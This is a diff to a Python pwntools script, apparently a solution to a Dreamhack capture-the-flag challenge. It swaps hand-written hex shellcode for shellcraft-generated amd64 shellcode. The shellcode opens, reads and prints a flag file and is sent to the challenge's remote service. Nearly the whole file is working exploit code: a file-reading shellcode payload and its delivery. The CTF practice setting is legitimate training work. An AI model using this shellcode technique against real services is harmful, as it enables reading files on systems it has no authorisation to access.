@@ -1,11 +1,16 @@
-# write asm code and make it into a binary file
-# read the binary file as string and send it through pwntools
+from pwn import *
 
-from pwn import remote
+context.arch = "amd64"
 
-port = 17904
-rem = remote("host3.dreamhack.games", port)
+port = 10411
+rem = remote("host1.dreamhack.games", port)
 
-shellcode = '\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05'
-rem.sendlineafter('shellcode: ', shellcode)
-print(rem.recv())
+payload = asm(shellcraft.open("/home/shell_basic/flag_name_is_loooooong"))
+payload += asm("mov rdi, rax")
+payload += asm("mov rsi, rsp")
+payload += asm("sub rsi, 0x30")
+payload += asm(shellcraft.read("rdi", "rsi", 0x30))
+payload += asm(shellcraft.write(1, "rsi", 0x30))
+
+rem.sendlineafter(b"shellcode: ", payload)
+print(rem.recvn(0x30))
